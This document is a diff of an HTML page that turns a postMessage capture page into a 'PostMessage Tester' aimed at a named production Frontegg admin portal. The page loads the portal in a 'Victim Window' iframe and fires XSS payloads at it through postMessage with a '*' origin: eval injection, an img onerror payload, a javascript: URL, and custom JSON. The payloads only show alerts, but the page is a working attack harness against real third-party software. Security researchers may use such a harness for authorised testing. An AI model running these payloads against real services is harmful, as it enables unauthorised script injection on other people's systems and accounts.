@@ -1,35 +1,117 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Privy postMessage Test</title>
+  <title>PostMessage Tester</title>
+  <style>
+    body { font-family: Arial; padding: 20px; }
+    .payload { background: #f0f0f0; padding: 10px; margin: 10px 0; }
+    button { padding: 10px 20px; margin: 5px; }
+    #log { border: 1px solid #ccc; padding: 10px; max-height: 300px; overflow-y: auto; }
+  </style>
 </head>
 <body>
-    <h1>Privy postMessage Capture</h1>
+  <h1>🎯 Frontegg PostMessage Tester</h1>
+  
+  <div>
+    <label>Target URL:</label>
+    <input type="text" id="targetUrl" value="https://portal.frontegg.com/development/home#/admin-box/" style="width: 400px;">
+  </div>
+  
+  <h3>Test Payloads:</h3>
+  
+  <button onclick="testPayload1()">Test 1: eval() payload</button>
+  <div class="payload">
+    <code>{ overrideSignupFields: 'alert(document.domain)' }</code>
+  </div>
+  
+  <button onclick="testPayload2()">Test 2: innerHTML payload</button>
+  <div class="payload">
+    <code>{ html: '&lt;img src=x onerror=alert(1)&gt;' }</code>
+  </div>
+  
+  <button onclick="testPayload3()">Test 3: action payload</button>
+  <div class="payload">
+    <code>{ action: 'navigate', url: 'javascript:alert(1)' }</code>
+  </div>
+  
+  <button onclick="testPayload4()">Test 4: Custom payload</button>
+  <textarea id="customPayload" style="width: 100%; height: 60px;">{"test": "value"}</textarea>
+  
+  <h3>Victim Window:</h3>
+  <iframe id="victimFrame" width="800" height="400" style="border: 2px solid blue;"></iframe>
+  
+  <h3>Log:</h3>
+  <div id="log"></div>
+  
+  <script>
+    let victimWindow = null;
     
-    <!-- Iframe embedding Privy -->
-    <iframe id="privyFrame" src="https://dashboard.privy.io/account-overview" width="800" height="600"></iframe>
+    function log(msg) {
+      const logDiv = document.getElementById('log');
+      const time = new Date().toLocaleTimeString();
+      logDiv.innerHTML += `[${time}] ${msg}<br>`;
+      logDiv.scrollTop = logDiv.scrollHeight;
+    }
     
-    <h2>Captured Messages:</h2>
-    <div id="messages"></div>
-
-    <script>
-        // Listen for all postMessage events
-        window.addEventListener('message', function(event) {
-            console.log('Message received:', event);
-            
-            // Log all details
-            const messageDiv = document.createElement('div');
-            messageDiv.style.border = '1px solid #ccc';
-            messageDiv.style.padding = '10px';
-            messageDiv.style.margin = '10px 0';
-            messageDiv.innerHTML = `
-                <strong>Origin:</strong> ${event.origin}<br>
-                <strong>Data:</strong> <pre>${JSON.stringify(event.data, null, 2)}</pre>
-                <strong>Source:</strong> ${event.source === document.getElementById('privyFrame').contentWindow ? 'iframe' : 'unknown'}
-            `;
-            
-            document.getElementById('messages').appendChild(messageDiv);
-        }, false);
-    </script>
+    function loadVictim() {
+      const url = document.getElementById('targetUrl').value;
+      const iframe = document.getElementById('victimFrame');
+      iframe.src = url;
+      victimWindow = iframe.contentWindow;
+      log(`Loading victim: ${url}`);
+      
+      // Wait for load
+      iframe.onload = () => {
+        log('✅ Victim loaded');
+      };
+    }
+    
+    function sendPayload(payload) {
+      if (!victimWindow) {
+        loadVictim();
+        setTimeout(() => sendPayload(payload), 3000);
+        return;
+      }
+      
+      log(`Sending payload: ${JSON.stringify(payload)}`);
+      victimWindow.postMessage(payload, '*');
+      log('✅ Payload sent');
+    }
+    
+    function testPayload1() {
+      sendPayload({
+        overrideSignupFields: 'alert("XSS via eval: " + document.domain)'
+      });
+    }
+    
+    function testPayload2() {
+      sendPayload({
+        html: '<img src=x onerror=alert("XSS via innerHTML")>',
+        content: '<img src=x onerror=alert("XSS via innerHTML")>'
+      });
+    }
+    
+    function testPayload3() {
+      sendPayload({
+        action: 'navigate',
+        url: 'javascript:alert(document.domain)'
+      });
+    }
+    
+    function testPayload4() {
+      try {
+        const payload = JSON.parse(document.getElementById('customPayload').value);
+        sendPayload(payload);
+      } catch(e) {
+        log('❌ Invalid JSON: ' + e.message);
+      }
+    }
+    
+    // Auto-load on page load
+    window.onload = () => {
+      log('🚀 Tester ready');
+      loadVictim();
+    };
+  </script>
 </body>
 </html>
